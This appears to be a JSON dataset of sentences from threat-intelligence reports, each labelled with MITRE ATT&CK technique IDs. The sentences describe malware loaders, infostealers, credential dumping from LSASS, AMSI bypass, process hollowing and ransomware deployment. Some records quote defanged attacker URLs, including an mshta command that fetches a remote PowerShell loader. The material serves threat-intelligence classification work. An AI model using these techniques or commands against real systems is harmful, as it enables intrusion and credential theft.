[
  {
    "type": "text",
    "text": "The email contains a ZIP attachment that holds a PE32 executable.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The executable, written in .NET, functions as a downloader for the next stage of the infection chain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When executed, the downloader reaches out to an IPFS gateway to retrieve a blob of data that has been hosted within the IPFS network as shown below.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This data contains an obfuscated PE32 executable that functions as the next-stage malware payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The downloader takes the data from the IPFS gateway and stores each byte in an array.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It then uses a key value stored in the executable to convert the byte array into the next-stage PE32.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is then reflectively loaded and executed, launching the next stage of the infection process, which in this case is a remote access trojan (RAT) called Agent Tesla.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In all three clusters, the initial payload functioned as a loader and operated similarly, however, the final payload hosted on the IPFS network was different in each cluster.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When executed, the loader first creates a directory structure within %APPDATA% using the following command:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The malware then attempts to retrieve Python 3.10 from the legitimate software provider using the cURL command.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the ZIP archive has been retrieved, it is then unzipped into the directory that was previously created using the PowerShell \"Expand-Archive\" cmdlet.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The malware then attempts to retrieve the final payload in the infection chain, storing it within the Network directory using the filename \"Packages.txt\".",
    "command": "",
    "labels": [
      "T1074.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "An example of the loader retrieving Hannabi Grabber, an information stealer written in Python is shown below.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the loader invokes the newly downloaded Python executable and passes the final payload as a command line argument, executing the next stage of the infection process.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, the malware was also observed achieving persistence via adding entries into the Windows registry at the following locations:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During our analysis of samples associated with this loader, we observed that the IPFS gateway that was being used was no longer servicing requests, however, Talos obtained the next-stage payloads manually via another IPFS gateways for analysis.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "At the time of analysis, the C2 server was no longer servicing requests on TCP/4444.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In another cluster we analyzed, we observed that the final payload hosted within IPFS was a Windows batch file, as shown below:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "When the batch file is retrieved, it is stored within the Network directory using the filename \"Script.bat\".",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Deleting directory contents stored within C:\\Users (typically associated with user profiles).",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Iterating through all mounted filesystems present on the system and deleting contents stored on them.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The final cluster of malware associated with this loader is responsible for retrieving and executing a Python-based information stealer called Hannabi Grabber.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It leverages Discord Webhooks for C2 and data exfiltration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It collects survey information from the infected machine, obtains the geographic location of the system via the IPInfo service, takes screenshots and eventually transmits that data to an attacker-controlled Discord server in JSON format.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The information stealer is particularly interested in Discord and Roblox data.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Application data that is collected is stored within a directory structure inside of the %TEMP% directory, in a folder called \"RedDiscord\" that is created by the malware.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Before exfiltrating the data, the malware creates a ZIP archive within the RedDiscord directory called \"Hannabi-<USERNAME>.zip\".",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware first transmits beacon information and will then attempt to exfiltrate the newly created ZIP archive.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This is a case where instead, the attacker chose to include a Python installation process during the infection and is leveraging Python directly to steal sensitive information from victims.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The configuration is dynamically stored in a QSettings class eventually being saved to disk, a typical functionality provided by that class.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "[os] which contains the command and control (C2) URLs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "All analyzed samples had three encoded C2 URLs that are used to register infections and then receive commands to execute on the infected endpoint.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled task starting at a specific time [T1053/005]",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled task starting at a different time an path [T1053/005]",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Link created on startup folder [T1547/001]",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon achieving persistence, the RAT contacts the C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the initial stages of execution, MagicRAT will perform just enough system reconnaissance to identify the system and environment in which the attackers are operating.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This is done by executing the commands whoami, systeminfo and ipconfig /all.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The last command has its results returned via the upload of the file zero_dump.mix to the C2.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The operator can determine the timing for the implant to sleep, change the C2 URLs and delete the implant from the infected system.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The first command connects to the download server and downloads an HTA application whose script is obfuscated with HTML Guardian, an application that encrypts HTML code.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When deobfuscated, the HTA file executes the VB script code to download and run PowerShell code from hxxp://31.41.244.231/0x?0=Loader, which launches the next stage of the loading process.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The autorunnn.exe module (d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) is a modified variant of the SharpHide open-source utility, which attempts to create a hidden registry entry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It uses NtSetValueKey native API to create a hidden (null-terminated) registry key by adding a null byte in front of the UNICODE_STRING key valuename.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell set to run the command: \"explorer.exe, cmd /c  mshta hxxp://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration\".",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The task name is \"OneDrive Standalone Update Task\" and it will attempt to execute the sams command to download and run the PowerShell loader: \"mshta hxxp://go.clss.cl/0k#=GoogleWindowsAnalyticsConfiguration\".",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Modified SharpHide code is used to hide registry startup entry.",
    "command": "",
    "labels": [
      "T1112",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As part of the logon sequence, the system executes a file, which ensures that the registry entry and the scheduled task set to download the next stage are set.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The loader contains embedded code of three modules, which are loaded using reflection as additional .NET assemblies into the PowerShell process space.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The downloaded PowerShell code also downloads and runs auxiliary modules and payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first disables AMSI scanning functionality, the second is the final payload, and the last injects the payload into the process space of a newly created process, usually RegSvcs.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The DLL contains obfuscated code, which attempts to patch Microsoft's AMSI interface (amsi.dll) AmsiScanBuffer function with the code to return an error value.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Amsi.dll is decoded, loaded and its Main function called.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It creates a new process and places the next injector stage into the newly created RegSvcs.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Friday.dll module is used to inject the next injection stage into RegSvcs.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It creates an instance of svchost.exe process and injects code using process-hollowing to load the final payload stored in the initial PowerShell loader script.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injector creates a svchost.exe process in suspended mode and then allocates virtual memory for the injection of the payload module.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The original svchost module is unmapped by calling the ZwUnmapViewOfSection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is followed by the fairly common injection sequence of API calls to get thread context, copy the data from the payload to the allocated virtual memory, set the thread context to point to the payload entry point and, finally, to resume the suspended thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the bitness of the operating system, the appropriate functions are used for getting and setting the thread contexts of the 32 bit process from the 64 bit operating system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ModernLoader's constructor initializes the bot with a hardcoded C2 URL.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the bot is initialized, it collects the following information about the system and send the information to the C2 server using the HTTP Post request to hxxp://31.41.244.231/AVAVA/gate.php:",
    "command": "",
    "labels": [
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Win32_ComputerSystemProduct UUID (using WMI to query the configuration data).",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The external IP address by reading the response from http://ipinfo.io/ip.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The IP address country by reading the response from http://ipinfo.io/country.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The user privileges (admin or user).",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Once the initial data is sent, ModernLoader reads the response to find tasks returned from the servers using the JSON format.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "DoTask accepts very few commands and can either execute a command line or download and execute a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ModernLoader runs in an endless loop periodically contacting the C2 server for new tasks until the process is terminated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Its main purpose is to download and execute additional payloads and modules, as instructed by the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Beyond the access provided by the first exploitation vector, the attackers made sure they had additional remote access to several internal systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The \"image file execution option\" debugger registry key was another way to ensure the malicious file would be persistently executed on the system:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, before setting up the reverse-ssh scheduled task tool attackers disabled logs for the task scheduler (a full list of disabled logs is provided in the IOC section below).",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Local and domain user credentials were collected, on a few key systems, by dumping the LSASS process memory and extracting credentials with Microsoft Sysinternals Procdump and Dumpert:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS memory:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Beyond the Windows login credentials, during the BlackCat attack, the attackers used a tool named \"steal.exe\" to harvest additional data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "During the BlackMatter attack, the attackers also searched for additional ways to maintain access.",
    "command": "",
    "labels": [
      "T1078",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "For example, the following command shows the attackers exploring an existing TeamViewer installation:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The following commands show the attackers exploring the keepass password manager config:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This tool was often used to issue a command to allow WinRM service network connections through the firewall, possibly for the convenience of using some prepared scripts:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft Remote Desktop was also used by the attackers to obtain GUI access to systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The following impacket command was issued before the adversary could gain remote admin access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload and download command, they revealed the use of Kali Linux to execute remote commands.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It is possible that document exfiltration is carried out by the execution of upload/download commands similar to the ones listed above.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the day of the attack, the attacker logged in to the domain controller and opened the group policy management interface.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The attackers then dropped and executed a file named \"apply.ps1.\"",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When encryption begins, the ransomware file named <num>.exe in the BlackCat attack and, similarly, <num>.exe in the BlackMatter attack, was dropped on the domain servers inside the SYSVOL folder, making it accessible on the NETLOGON network share, accessible by all users in the domain.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We also have artifacts available from our cases such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "However, we found that these threat actors seem to prefer to broaden their access throughout the network by launching several Cobalt Strike beacon sessions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "And then we log in with a local admin or a domain account and use the charms of Anydesk.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "You can also download / upload to / from the victim's machine…",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Some of the notable ones are: Dumping of LSASS using Task Manager and Procdump, creation of a copy of NTDS.dit using ntdsutil.exe and extraction of SAM, SECURITY and SYSTEM hives.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the level of access, threat actors are looking to escalate privileges on the beachhead host to leverage high integrity Beacon sessions.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Having high integrity access allows them to access credentials from the host using various methods.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Accessing the LSASS process is the method that we see used by threat actors in the majority of the cases.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Using Cobalt Strike, attackers can extract credentials from the LSASS process either with the use of Mimikatz or by accessing the security hives.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors can also use third-party tools such as ProcDump or even Task Manager in cases where remote interactive access is possible.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "These methods allow them to dump the LSASS process to disk and take it offline to extract the credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "When it comes to defense evasion, we noticed that process injection techniques were very common among threat actors.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This allows them to establish additional Beacons on the already compromised hosts, to avoid detection.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1078",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In that case, the attackers used multiple batch files to disable well-known AV and EDR agents on the host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and the AdFind tool.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "One common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Discovering security audit tools",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Most of the default profiles are well known and can be detected by host and network monitoring rules.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike continues to be the top post-exploitation tool favored by most threat actor groups, with the most popular malleable c2 profile observed this year being ‘jquery-3.3.1.min.js’ with the relevant Beacon spawning under Rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We can only assume that the operators attempted to invoke a Cobalt Strike aggressor script to enumerate and discover the installed AV.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Along with third-party tooling, living-off-the-land techniques are routinely observed – especially during the discovery phase.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "AdFind is the usual suspect in almost every intrusion we report.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Results of various Tools/scripts are left behind along with the tools themselves, i.e.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "text files containing collected host details from discovery, executable beacons in user folders etc.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "One example includes the operator’s source machine during a remote desktop session – CONTInuing the Bazar Ransomware.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Another case, was during what we believed to have been a technical issue – a hosted beacon, was remotely pulled (out of band coms) – rather than through the standard C2 that was already established – BazarCall to Conti Ransomware via Trickbot and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload was available from a public facing IP, and pulled using the curl command (evident by the Curl user agent string).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Disabling macros and forcing scriptable files to open in notepad will also provide a high level of return on investment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "However, one of the biggest shifts in this space has been the discontinuance of Macro usage in Word and Excel files due to Microsoft’s decision to disable macros on files downloaded from the internet.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors quickly reacted and began shifting to the usage of ISO and ZIP files containing LNK shortcuts to execute initial payloads.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We have observed a declining usage of Word and Excel files, however, we observed some malware families delivering Word documents weaponized with exploits such as CVE-2022-30190.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Many malware families that previously relied on macros have begun to migrate over to ISO and ZIP files packaging malicious LNK or script files.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Cases with a non-phishing means of initial access, such as exploitation and RDP brute forcing, may not always result in ransomware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Due to the disproportional amount of phishing cases we reported, the technique associated with “Malicious File – T1204.002” is at the top of the list.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell continues to be a favorite among threat actors for its flexibility and ability to stay in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We have observed continued usage of remote services created for the purpose of lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "These services are created to be run once as SYSTEM, and execute the threat actors’ payload.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "However, we have also observed other payloads being run, such as Sysinternals Procdump.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DLLs are a very common way for threat actors to package their payloads for execution, this includes payloads related to malware such as IcedID, Emotet and Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The early-stage persistence is related to the malware families that facilitate initial access to an environment or exploits the target’s internet facing services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Most often, we observe the initial access malware persist on the system via Registry Run Keys or a Scheduled Task and exploitation attempts usually left web shells, which were accessible via the internet.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Emotet and Ursnif were observed using Run Keys for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Emotet was seen copying a DLL into the user’s AppData folder and executing it with rundll32, while Ursnif used a Run Key to execute a PowerShell script via a LNK file.",
    "command": "",
    "labels": [
      "T1106",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "IcedID, Qbot, and Gootloader have all been observed making use of Scheduled Tasks to execute their payloads after the main execution of the malware.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The primary objective of a threat actor will always be to get the highest privileges needed to accomplish their goal(s).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These methods range from using legitimate accounts to setting up scheduled tasks and using certain vulnerabilities that, if exploited, could provide the threat actors with privileged permissions.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Process injection led the way in this category.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process injection was used both by initial access malware like Qbot, and as even more commonly observed, used by post-exploitation tools.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process injection by Qbot into msra.exe from Qbot Likes to Move It, Move It.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon Event ID 8 logs showing Cobalt Strike injection from Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike injected process using YARA signatures from BumbleBee Zeros in on Meterpreter",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Injected Cobalt Strike from Volatility malfind data from the Quantum Ransomware report.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After process injection, another notable category is the pair of techniques T1218.010 and T1218.011, the use of Rundll32 and Regsvr32 as some of the favored tools in use by threat actors to execute their payloads.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Again, like process injection, this can be observed both by initial access malware and later post-exploitation tools.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example, we can see Regsvr32 being utilized both in execution of the IcedID malware and later on to execute the ransomware binary from Stolen Images Campaign Ends in Conti Ransomware.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "And in that same case, the scheduled task used Rundll32 to execute the IcedID payload.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned in the initial access section, we observed the move away from various macro initial access files like Word and Excel and the beginning of utilizing file formats which bypass the Mark-of-the-Web such as ISO, IMG, VHD, etc.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Bumblebee malware was a trail blazer in this, three different reports utilized ISO files with LNK and DLL files contained within.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "One of the primary goals of a threat actor is to get privileged credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The usage of mimikatz and in particular programs like LaZagne, which are used to dump numerous items (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.), are unquestionably among the most common methods.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The LSASS process is the number one target for threat actors because it contains various credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "If the compromised account has the required privileges, LSASS can be dumped or accessed using several tools.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "It is easy to see how having the ability to dump the memory contents of this process allows the attacker to obtain the privileged passwords contained inside it.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "While the LSASS process is always the target, threat actors use a variety of tools to get at the credentials within.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These strategies can range from the use of third-party frameworks like Cobalt Strike (described here), or system utilities like the Task Manager, to administrative tools like Sysinternals ProcDump.",
    "command": "",
    "labels": [
      "T1055",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The report “BumbleBee Zeros in on Meterpreter” contains an example of utilizing ProcDump for LSASS dump:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The use of a framework such as Cobalt Strike may be noticed inside the “Dead or Alive an Emotet story” report:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "If cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Looking at the data we have collected for the past year, it is clear that the most commonly used commands are the ones that leverage Windows binaries to gather information about the host and network, such as IP addresses, active connections, and system-related information.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RDP and SMB/Windows Admin Shares top the list around 41% each.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It is not surprising that attackers prefer the interactive graphics interface RDP provides.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Such access allows them to search for sensitive documents or any other information without setting off any alerts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "When a connection is established, event ID 4624 LogonType 10 of the security event log can provide us with the name of the remote host that initiated the connection.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This same data can show up in other logs like Event ID 4778 under Security as observed from Quantum Ransomware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors then use the beachhead host to RDP to other hosts in the environment, assuming they have obtained the necessary access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We have seen a combination of ways malicious operators copy a tool over to the remote host and then use Cobalt Strike to run it.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1105"
    ]
  },
  {
    "type": "text",
